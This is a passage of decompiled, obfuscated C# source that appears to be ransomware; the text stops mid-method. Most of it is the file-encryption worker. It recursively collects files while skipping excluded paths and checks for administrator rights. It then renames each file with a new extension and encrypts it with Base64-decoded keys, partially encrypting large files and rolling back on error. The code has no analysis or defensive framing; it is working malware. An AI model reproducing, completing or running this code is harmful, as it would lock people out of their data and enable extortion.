using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using LTByDrNryKeo;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace HSFBHZCtMXjPES;

internal sealed class UzNyTypkvLt
{
	public sealed class YxIMZImbGZbj
	{
		private static StringCollection glENZoRuLy;

		private static List<string> aUNBjPXKYWE;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107400261));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if ((!text.ToLower().Contains(getString_0(107400256)) && !text.ToLower().Contains(getString_0(107400267)) && !text.ToLower().Contains(getString_0(107385799)) && !text.ToLower().Contains(getString_0(107385818)) && !text.ToLower().Contains(getString_0(107400222)) && !text.ToLower().Contains(getString_0(107385126)) && !text.ToLower().Contains(getString_0(107385026)) && !text.ToLower().Contains(getString_0(107385041)) && !text.ToLower().Contains(getString_0(107384992)) && !text.ToLower().Contains(getString_0(107385007)) && !text.ToLower().Contains(getString_0(107384973)) && !text.ToLower().Contains(getString_0(107385436)) && !text.ToLower().Contains(getString_0(107385451)) && !text.ToLower().Contains(getString_0(107385406)) && !text.ToLower().Contains(getString_0(107385385)) && !text.ToLower().Contains(getString_0(107385372)) && !text.ToLower().Contains(getString_0(107385391)) && !text.ToLower().Contains(getString_0(107385342)) && !text.ToLower().Contains(getString_0(107385357)) && !text.Contains(VzYMPTFsHuw(getString_0(107385308))) && !text.Contains(getString_0(107385283)) && !text.Contains(getString_0(107385302)) && !text.EndsWith(getString_0(107394905)) && !text.EndsWith(getString_0(107385253)) && !text.EndsWith(getString_0(107385248)) && !text.EndsWith(getString_0(107385243)) && !text.EndsWith(getString_0(107385270)) && !text.ToLower().Contains(getString_0(107385265)) && !text.ToLower().Contains(PYZhiSywDob)) || text.Contains(VzYMPTFsHuw(getString_0(107385099))))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(YsIgwUYIkhJk) * 1024.0 * 1024.0 && MIxirqlACCH == getString_0(107396833))
							{
								aUNBjPXKYWE.Add(text);
							}
							else if (File.Exists(text) && MIxirqlACCH == getString_0(107396728))
							{
								aUNBjPXKYWE.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				array3 = array2;
				foreach (string string_ in array3)
				{
					WalkDirectoryTree(string_);
				}
			}
			return aUNBjPXKYWE;
		}

		static YxIMZImbGZbj()
		{
			Strings.CreateGetStringDelegate(typeof(YxIMZImbGZbj));
			glENZoRuLy = new StringCollection();
			aUNBjPXKYWE = new List<string>();
		}
	}

	private sealed class aNONGKaYCkHOllyj
	{
		public string KnxGsfHEYQrBJ;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == KnxGsfHEYQrBJ;
		}
	}

	private sealed class LdjHjnvKojp
	{
		public string dRGYTxVjrZ;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__1a(int int_0)
		{
			Thread.Sleep(PtQKcSkXgtK);
			UnsVNkGvmiq.Add(getString_0(107384686) + dRGYTxVjrZ + getString_0(107396758) + (char)int_0 + getString_0(107400240));
			try
			{
				if (vgTZYvMerotpU)
				{
					Console.WriteLine(getString_0(107384686) + dRGYTxVjrZ + getString_0(107396758) + (char)int_0 + getString_0(107400240));
				}
			}
			catch
			{
			}
		}

		static LdjHjnvKojp()
		{
			Strings.CreateGetStringDelegate(typeof(LdjHjnvKojp));
		}
	}

	private sealed class JRNxOCaXBv
	{
		private sealed class GWxLXRYTXtf
		{
			public JRNxOCaXBv BvsuvyFlecPx;

			public string zCOMAcLqEnWzTo;

			public void _003CCrypt_003Eb__26()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					bCzvlqPWbSFdYG(WindowsIdentity.GetCurrent().Name, zCOMAcLqEnWzTo);
				}
			}

			public void _003CCrypt_003Eb__27()
			{
				xWYfnlpQmptOgS(zCOMAcLqEnWzTo, BvsuvyFlecPx.RFZBgYpIbPnq, BvsuvyFlecPx.oXYPGbgDNUb, BvsuvyFlecPx.AVhdNmhHLkw, BvsuvyFlecPx.hnzMMdLcyXg);
			}
		}

		public string[] RFZBgYpIbPnq;

		public string[] AVhdNmhHLkw;

		public string hnzMMdLcyXg;

		public string oXYPGbgDNUb;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__25(string string_0)
		{
			GWxLXRYTXtf CS_0024_003C_003E8__locals0 = new GWxLXRYTXtf();
			CS_0024_003C_003E8__locals0.BvsuvyFlecPx = this;
			CS_0024_003C_003E8__locals0.zCOMAcLqEnWzTo = string_0;
			if (BrcuPGYukd && !uGgsLnwioPEKG().Contains(getString_0(107382557)) && !uGgsLnwioPEKG().Contains(getString_0(107400208)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						bCzvlqPWbSFdYG(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.zCOMAcLqEnWzTo);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (nAhrhGGnjLvL == getString_0(107396841))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					xWYfnlpQmptOgS(CS_0024_003C_003E8__locals0.zCOMAcLqEnWzTo, CS_0024_003C_003E8__locals0.BvsuvyFlecPx.RFZBgYpIbPnq, CS_0024_003C_003E8__locals0.BvsuvyFlecPx.oXYPGbgDNUb, CS_0024_003C_003E8__locals0.BvsuvyFlecPx.AVhdNmhHLkw, CS_0024_003C_003E8__locals0.BvsuvyFlecPx.hnzMMdLcyXg);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				xWYfnlpQmptOgS(CS_0024_003C_003E8__locals0.zCOMAcLqEnWzTo, RFZBgYpIbPnq, oXYPGbgDNUb, AVhdNmhHLkw, hnzMMdLcyXg);
			}
		}

		static JRNxOCaXBv()
		{
			Strings.CreateGetStringDelegate(typeof(JRNxOCaXBv));
		}
	}

	private sealed class MIWsSuEMIryyp
	{
		private sealed class ekzjBCvFZx
		{
			public MIWsSuEMIryyp mFDLzGHrXSuJRBu;

			public string popfiosTtsUtLa;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__33()
			{
				foreach (string item in QrfGnpJnAuCjH)
				{
					if (popfiosTtsUtLa.ToLower().EndsWith(item + mFDLzGHrXSuJRBu.hJijbCOiRyyoj) && cfLqyLJDABPGnW == getString_0(107396852))
					{
						if (Convert.ToInt32(IAXzEIcMsJCbe) * 1024 * 1024 > new FileInfo(popfiosTtsUtLa).Length)
						{
							try
							{
								chuLHDnVuoGm.XEbKwrzWPjZipB(getString_0(107386463), getString_0(107386426), getString_0(107386445), popfiosTtsUtLa);
							}
							catch
							{
							}
						}
					}
					else if (popfiosTtsUtLa.ToLower().EndsWith(item) && cfLqyLJDABPGnW == getString_0(107396747))
					{
						try
						{
							chuLHDnVuoGm.XEbKwrzWPjZipB(getString_0(107386463), getString_0(107386426), getString_0(107386445), popfiosTtsUtLa);
						}
						catch
						{
						}
					}
				}
			}

			static ekzjBCvFZx()
			{
				Strings.CreateGetStringDelegate(typeof(ekzjBCvFZx));
			}
		}

		private sealed class XbaJUSLINbQ
		{
			public MIWsSuEMIryyp mFDLzGHrXSuJRBu;

			public string nLhTwbRovRDpH;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__35()
			{
				foreach (string item in QrfGnpJnAuCjH)
				{
					if (nLhTwbRovRDpH.ToLower().EndsWith(item + mFDLzGHrXSuJRBu.hJijbCOiRyyoj) && cfLqyLJDABPGnW == getString_0(107396855))
					{
						if (Convert.ToInt32(IAXzEIcMsJCbe) * 1024 * 1024 > new FileInfo(nLhTwbRovRDpH).Length)
						{
							try
							{
								chuLHDnVuoGm.XEbKwrzWPjZipB(getString_0(107386466), getString_0(107386429), getString_0(107386448), nLhTwbRovRDpH);
							}
							catch
							{
							}
						}
					}
					else if (nLhTwbRovRDpH.ToLower().EndsWith(item) && cfLqyLJDABPGnW == getString_0(107396750))
					{
						try
						{
							chuLHDnVuoGm.XEbKwrzWPjZipB(getString_0(107386466), getString_0(107386429), getString_0(107386448), nLhTwbRovRDpH);
						}
						catch
						{
						}
					}
				}
			}

			static XbaJUSLINbQ()
			{
				Strings.CreateGetStringDelegate(typeof(XbaJUSLINbQ));
			}
		}

		public List<string> aYHHSmaEaZH;

		public List<string> CUuOmmxXYbdtCA;

		public string hJijbCOiRyyoj;

		public string[] XnYPhviXEFMTAt;

		public string yifqLwxnUift;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__32(string string_0)
		{
			ekzjBCvFZx CS_0024_003C_003E8__locals0;
			foreach (string item in CUuOmmxXYbdtCA)
			{
				if (XnYPhviXEFMTAt.Length != 0)
				{
					string[] xnYPhviXEFMTAt = XnYPhviXEFMTAt;
					int num = 0;
					while (num < xnYPhviXEFMTAt.Length)
					{
						string value = xnYPhviXEFMTAt[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0987;
					}
				}
				try
				{
					if (item.EndsWith(hJijbCOiRyyoj))
					{
						goto IL_0987;
					}
				}
				catch (Exception)
				{
					goto IL_0987;
				}
				if (!item.EndsWith(string_0) || aacDzVOnoKU.Contains(item))
				{
					continue;
				}
				if (nUcCUJIepUVWBM == getString_0(107396849))
				{
					try
					{
						if (xhISZmOqgVfP.SyQDXJZMiVcpJ(item))
						{
							xhISZmOqgVfP.TyPIvAqBtcBzN(item);
						}
					}
					catch
					{
					}
				}
				aacDzVOnoKU.Add(item);
				if (!DhgHRwHTnLl.Contains(Path.GetDirectoryName(item)))
				{
					DhgHRwHTnLl.Add(Path.GetDirectoryName(item));
				}
				qutpUeZZrAG(item);
				try
				{
					new EKxCzvGOtOOlKz().jKBwrfyEeHsIKw(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (vgTZYvMerotpU)
							{
								Console.WriteLine(getString_0(107400203) + item + getString_0(107400190) + new FileInfo(item).Length + getString_0(107400169));
								Console.WriteLine(getString_0(107400160));
							}
						}
						catch
						{
						}
						gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107399511)), getString_0(107384653) + item + getString_0(107384653) + VzYMPTFsHuw(getString_0(107399518)) + getString_0(107384653) + Environment.UserName + getString_0(107384653) + VzYMPTFsHuw(getString_0(107399469)));
					}
				}
				catch (Exception ex2)
				{
					if (XtQtDAAqcssaA)
					{
						try
						{
							File.AppendAllText(IuaKWfBuBpJ, getString_0(107383179) + item + getString_0(107399444) + ex2.Message + getString_0(107395774));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (XtQtDAAqcssaA)
						{
							try
							{
								File.AppendAllText(IuaKWfBuBpJ, getString_0(107383179) + item + getString_0(107399395) + ex2.Message + getString_0(107395774));
							}
							catch (Exception)
							{
							}
						}
						azNcSbADWgl++;
						goto end_IL_02ef;
					}
					byte[] bytes;
					if (yKirRorQtiUWa == getString_0(107396849) && new FileInfo(item).Length > Convert.ToInt32(OLieTsrCJKKkG) * 1024 * 1024 && !aYHHSmaEaZH.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new ekzjBCvFZx();
						CS_0024_003C_003E8__locals0.mFDLzGHrXSuJRBu = this;
						try
						{
							if (hJijbCOiRyyoj != getString_0(107382415))
							{
								if (MNVRxjtsYUxy)
								{
									hJijbCOiRyyoj = WesWtWKgSJxOqJ + hJijbCOiRyyoj;
								}
								File.Move(item, item + hJijbCOiRyyoj);
							}
						}
						catch (Exception ex2)
						{
							if (XtQtDAAqcssaA)
							{
								try
								{
									File.AppendAllText(IuaKWfBuBpJ, getString_0(107383179) + item + getString_0(107399334) + ex2.Message + getString_0(107395774));
								}
								catch (Exception)
								{
								}
							}
							azNcSbADWgl++;
							goto end_IL_02ef;
						}
						CS_0024_003C_003E8__locals0.popfiosTtsUtLa = getString_0(107386347);
						if (hJijbCOiRyyoj != getString_0(107382415))
						{
							CS_0024_003C_003E8__locals0.popfiosTtsUtLa = item + hJijbCOiRyyoj;
						}
						else
						{
							CS_0024_003C_003E8__locals0.popfiosTtsUtLa = item;
						}
						if (OULbCWoifC == getString_0(107396849))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in QrfGnpJnAuCjH)
								{
									if (CS_0024_003C_003E8__locals0.popfiosTtsUtLa.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.mFDLzGHrXSuJRBu.hJijbCOiRyyoj) && cfLqyLJDABPGnW == ekzjBCvFZx.getString_0(107396852))
									{
										if (Convert.ToInt32(IAXzEIcMsJCbe) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.popfiosTtsUtLa).Length)
										{
											try
											{
												chuLHDnVuoGm.XEbKwrzWPjZipB(ekzjBCvFZx.getString_0(107386463), ekzjBCvFZx.getString_0(107386426), ekzjBCvFZx.getString_0(107386445), CS_0024_003C_003E8__locals0.popfiosTtsUtLa);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.popfiosTtsUtLa.ToLower().EndsWith(item2) && cfLqyLJDABPGnW == ekzjBCvFZx.getString_0(107396747))
									{
										try
										{
											chuLHDnVuoGm.XEbKwrzWPjZipB(ekzjBCvFZx.getString_0(107386463), ekzjBCvFZx.getString_0(107386426), ekzjBCvFZx.getString_0(107386445), CS_0024_003C_003E8__locals0.popfiosTtsUtLa);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						bytes = Encoding.ASCII.GetBytes(kqGxspAqmKwYfMRE);
						byte[] array = null;
						byte[] byte_ = nTOXQbVewSXTFiv.zyRLkdiKoM(CS_0024_003C_003E8__locals0.popfiosTtsUtLa, Convert.ToInt32(OLieTsrCJKKkG) * 1024 * 1024);
						if (!nTOXQbVewSXTFiv.nzAnvDfCOCtBIgh(qvpNQzoNrMBw: (!EwFuVhMNxUkHL) ? (VSeBsFuIKiNqF ? nTOXQbVewSXTFiv.LFBNnGzEowO(byte_, Convert.FromBase64String(yifqLwxnUift), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nTOXQbVewSXTFiv.LFBNnGzEowO(byte_, Convert.FromBase64String(yifqLwxnUift), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (VSeBsFuIKiNqF ? TzDtpbVJUP.XeximicAtk(byte_, Convert.FromBase64String(yifqLwxnUift), Convert.FromBase64String(lASimeaIGcCh)) : TzDtpbVJUP.XeximicAtk(byte_, Convert.FromBase64String(yifqLwxnUift), Convert.FromBase64String(lASimeaIGcCh))), sEnEvTXbkUj: CS_0024_003C_003E8__locals0.popfiosTtsUtLa, aBOyLyAioGlSxs: bytes))
						{
							try
							{
								File.Move(item + hJijbCOiRyyoj, item);
							}
							catch (Exception)
							{
							}
							continue;
						}
						goto IL_0987;
					}
					if (MNVRxjtsYUxy)
					{
						hJijbCOiRyyoj = WesWtWKgSJxOqJ + hJijbCOiRyyoj;
					}
					bytes = Encoding.ASCII.GetBytes(kqGxspAqmKwYfMRE);
					if (hJijbCOiRyyoj != getString_0(107382415))
					{
						if (!TBRkxWpRCztklVA)
						{
							if (!VSeBsFuIKiNqF)
							{
								yGIPnmDWDLY(item, item + hJijbCOiRyyoj, LGcIAPIHUXZNO);
							}
							else
							{
								yGIPnmDWDLY(item, item + hJijbCOiRyyoj, Convert.FromBase64String(yifqLwxnUift));
							}
						}
						else
						{
							try
							{
								if (!VSeBsFuIKiNqF)
								{
									awipvienyInhBz(item, item + hJijbCOiRyyoj, LGcIAPIHUXZNO, Convert.FromBase64String(lASimeaIGcCh));
								}
								else
								{
									awipvienyInhBz(item, item + hJijbCOiRyyoj, Convert.FromBase64String(yifqLwxnUift), Convert.FromBase64String(lASimeaIGcCh));
								}
							}
							catch (Exception ex2)
							{
								if (XtQtDAAqcssaA)
								{
									try
									{
										File.AppendAllText(IuaKWfBuBpJ, getString_0(107383179) + item + getString_0(107382433) + ex2.Message + getString_0(107395774));
									}
									catch (Exception)
									{
									}
								}
								azNcSbADWgl++;
								try
								{
									File.Move(item + hJijbCOiRyyoj, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_02ef;
							}
						}
					}
					else if (!TBRkxWpRCztklVA)
					{
						if (!VSeBsFuIKiNqF)
						{
							yGIPnmDWDLY(item, item + getString_0(107382442), LGcIAPIHUXZNO);
						}
						else
						{
							yGIPnmDWDLY(item, item + getString_0(107382442), Convert.FromBase64String(yifqLwxnUift));
						}
					}
					else
					{
						try
						{
							if (!VSeBsFuIKiNqF)
							{
								awipvienyInhBz(item, item, LGcIAPIHUXZNO, Convert.FromBase64String(lASimeaIGcCh));
							}
							else
							{
								awipvienyInhBz(item, item, Convert.FromBase64String(yifqLwxnUift), Convert.FromBase64String(lASimeaIGcCh));
							}
						}
						catch (Exception ex2)
						{
							if (XtQtDAAqcssaA)
							{
								try
								{
									File.AppendAllText(IuaKWfBuBpJ, getString_0(107383179) + item + getString_0(107382433) + ex2.Message + getString_0(107395774));
								}
								catch (Exception)
								{
								}
							}
							azNcSbADWgl++;
							goto end_IL_02ef;
						}
					}
					if (VSeBsFuIKiNqF)
					{
						if (hJijbCOiRyyoj != getString_0(107382415))
						{
							mkjUeNwAcldzu(item + hJijbCOiRyyoj, bytes);
						}
						else
						{
							mkjUeNwAcldzu(item, bytes);
						}
					}
					goto IL_0987;
					end_IL_02ef:;
				}
				catch (Exception)
				{
					goto IL_0987;
				}
				continue;
				IL_0987:
				CUuOmmxXYbdtCA.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__34(string string_0)
		{
			XbaJUSLINbQ CS_0024_003C_003E8__locals0 = new XbaJUSLINbQ();
			CS_0024_003C_003E8__locals0.mFDLzGHrXSuJRBu = this;
			CS_0024_003C_003E8__locals0.nLhTwbRovRDpH = string_0;
			if (XnYPhviXEFMTAt.Length != 0)
			{
				string[] xnYPhviXEFMTAt = XnYPhviXEFMTAt;
				int num = 0;
				while (num < xnYPhviXEFMTAt.Length)
				{
					string value = xnYPhviXEFMTAt[num];
					if (!CS_0024_003C_003E8__locals0.nLhTwbRovRDpH.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0a1f;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.nLhTwbRovRDpH.EndsWith(hJijbCOiRyyoj))
				{
					goto IL_0a1f;
				}
			}
			catch (Exception)
			{
				goto IL_0a1f;
			}
			if (!aacDzVOnoKU.Contains(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH))
			{
				if (nUcCUJIepUVWBM == getString_0(107396849))
				{
					try
					{
						if (xhISZmOqgVfP.SyQDXJZMiVcpJ(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH))
						{
							xhISZmOqgVfP.TyPIvAqBtcBzN(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
						}
					}
					catch
					{
					}
				}
				aacDzVOnoKU.Add(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
				if (!DhgHRwHTnLl.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH)))
				{
					DhgHRwHTnLl.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH));
				}
				qutpUeZZrAG(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
				try
				{
					new EKxCzvGOtOOlKz().jKBwrfyEeHsIKw(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (vgTZYvMerotpU)
							{
								Console.WriteLine(getString_0(107400203) + CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + getString_0(107400190) + new FileInfo(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH).Length + getString_0(107400169));
								Console.WriteLine(getString_0(107400160));
							}
						}
						catch
						{
						}
						gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107399511)), getString_0(107384653) + CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + getString_0(107384653) + VzYMPTFsHuw(getString_0(107399518)) + getString_0(107384653) + Environment.UserName + getString_0(107384653) + VzYMPTFsHuw(getString_0(107399469)));
					}
				}
				catch (Exception ex2)
				{
					if (XtQtDAAqcssaA)
					{
						try
						{
							File.AppendAllText(IuaKWfBuBpJ, getString_0(107383179) + CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + getString_0(107399444) + ex2.Message + getString_0(107395774));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH).Length != 0L)
						{
							goto end_IL_032e;
						}
						goto end_IL_032d;
						end_IL_032e:;
					}
					catch (Exception ex2)
					{
						if (XtQtDAAqcssaA)
						{
							try
							{
								File.AppendAllText(IuaKWfBuBpJ, getString_0(107383179) + CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + getString_0(107399395) + ex2.Message + getString_0(107395774));
							}
							catch (Exception)
							{
							}
						}
						azNcSbADWgl++;
						goto end_IL_032d;
					}
					if (yKirRorQtiUWa == getString_0(107396849) && new FileInfo(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH).Length > Convert.ToInt32(OLieTsrCJKKkG) * 1024 * 1024)
					{
						try
						{
							if (hJijbCOiRyyoj != getString_0(107382415))
							{
								if (MNVRxjtsYUxy)
								{
									hJijbCOiRyyoj = WesWtWKgSJxOqJ + hJijbCOiRyyoj;
								}
								File.Move(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + hJijbCOiRyyoj);
							}
						}
						catch (Exception ex2)
						{
							if (XtQtDAAqcssaA)
							{
								try
								{
									File.AppendAllText(IuaKWfBuBpJ, getString_0(107383179) + CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + getString_0(107399334) + ex2.Message + getString_0(107395774));
								}
								catch (Exception)
								{
								}
							}
							azNcSbADWgl++;
							return;
						}
						if (hJijbCOiRyyoj != getString_0(107382415))
						{
							CS_0024_003C_003E8__locals0.nLhTwbRovRDpH += hJijbCOiRyyoj;
						}
						if (OULbCWoifC == getString_0(107396849))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in QrfGnpJnAuCjH)
								{
									if (CS_0024_003C_003E8__locals0.nLhTwbRovRDpH.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.mFDLzGHrXSuJRBu.hJijbCOiRyyoj) && cfLqyLJDABPGnW == XbaJUSLINbQ.getString_0(107396855))
									{
										if (Convert.ToInt32(IAXzEIcMsJCbe) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH).Length)
										{
											try
											{
												chuLHDnVuoGm.XEbKwrzWPjZipB(XbaJUSLINbQ.getString_0(107386466), XbaJUSLINbQ.getString_0(107386429), XbaJUSLINbQ.getString_0(107386448), CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.nLhTwbRovRDpH.ToLower().EndsWith(item) && cfLqyLJDABPGnW == XbaJUSLINbQ.getString_0(107396750))
									{
										try
										{
											chuLHDnVuoGm.XEbKwrzWPjZipB(XbaJUSLINbQ.getString_0(107386466), XbaJUSLINbQ.getString_0(107386429), XbaJUSLINbQ.getString_0(107386448), CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						byte[] bytes = Encoding.ASCII.GetBytes(kqGxspAqmKwYfMRE);
						byte[] array = null;
						byte[] byte_ = nTOXQbVewSXTFiv.zyRLkdiKoM(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, Convert.ToInt32(OLieTsrCJKKkG) * 1024 * 1024);
						if (!nTOXQbVewSXTFiv.nzAnvDfCOCtBIgh(qvpNQzoNrMBw: (!EwFuVhMNxUkHL) ? (VSeBsFuIKiNqF ? nTOXQbVewSXTFiv.LFBNnGzEowO(byte_, Convert.FromBase64String(yifqLwxnUift), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nTOXQbVewSXTFiv.LFBNnGzEowO(byte_, Convert.FromBase64String(yifqLwxnUift), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (VSeBsFuIKiNqF ? TzDtpbVJUP.XeximicAtk(byte_, Convert.FromBase64String(yifqLwxnUift), Convert.FromBase64String(lASimeaIGcCh)) : TzDtpbVJUP.XeximicAtk(byte_, Convert.FromBase64String(yifqLwxnUift), Convert.FromBase64String(lASimeaIGcCh))), sEnEvTXbkUj: CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, aBOyLyAioGlSxs: bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + hJijbCOiRyyoj, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (MNVRxjtsYUxy)
						{
							hJijbCOiRyyoj = WesWtWKgSJxOqJ + hJijbCOiRyyoj;
						}
						byte[] bytes = Encoding.ASCII.GetBytes(kqGxspAqmKwYfMRE);
						if (hJijbCOiRyyoj != getString_0(107382415))
						{
							if (!TBRkxWpRCztklVA)
							{
								if (!VSeBsFuIKiNqF)
								{
									yGIPnmDWDLY(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + hJijbCOiRyyoj, LGcIAPIHUXZNO);
								}
								else
								{
									yGIPnmDWDLY(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + hJijbCOiRyyoj, Convert.FromBase64String(yifqLwxnUift));
								}
							}
							else
							{
								try
								{
									if (!VSeBsFuIKiNqF)
									{
										awipvienyInhBz(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + hJijbCOiRyyoj, LGcIAPIHUXZNO, Convert.FromBase64String(lASimeaIGcCh));
									}
									else
									{
										awipvienyInhBz(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + hJijbCOiRyyoj, Convert.FromBase64String(yifqLwxnUift), Convert.FromBase64String(lASimeaIGcCh));
									}
								}
								catch (Exception ex2)
								{
									if (XtQtDAAqcssaA)
									{
										try
										{
											File.AppendAllText(IuaKWfBuBpJ, getString_0(107383179) + CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + getString_0(107382433) + ex2.Message + getString_0(107395774));
										}
										catch (Exception)
										{
										}
									}
									azNcSbADWgl++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + hJijbCOiRyyoj, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!TBRkxWpRCztklVA)
						{
							if (!VSeBsFuIKiNqF)
							{
								yGIPnmDWDLY(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + getString_0(107382442), LGcIAPIHUXZNO);
							}
							else
							{
								yGIPnmDWDLY(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + getString_0(107382442), Convert.FromBase64String(yifqLwxnUift));
							}
						}
						else
						{
							try
							{
								if (!VSeBsFuIKiNqF)
								{
									awipvienyInhBz(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, LGcIAPIHUXZNO, Convert.FromBase64String(lASimeaIGcCh));
								}
								else
								{
									awipvienyInhBz(CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, CS_0024_003C_003E8__locals0.nLhTwbRovRDpH, Convert.FromBase64String(yifqLwxnUift), Convert.FromBase64String(lASimeaIGcCh));
								}
							}
							catch (Exception ex2)
							{
								if (XtQtDAAqcssaA)
								{
									try
									{
										File.AppendAllText(IuaKWfBuBpJ, getString_0(107383179) + CS_0024_003C_003E8__locals0.nLhTwbRovRDpH + getString_0(107382433) + ex2.Message + getString_0(107395774));
									}
									catch (Exception)
									{
									}
								}
								azNcSbADWgl++;
								return;
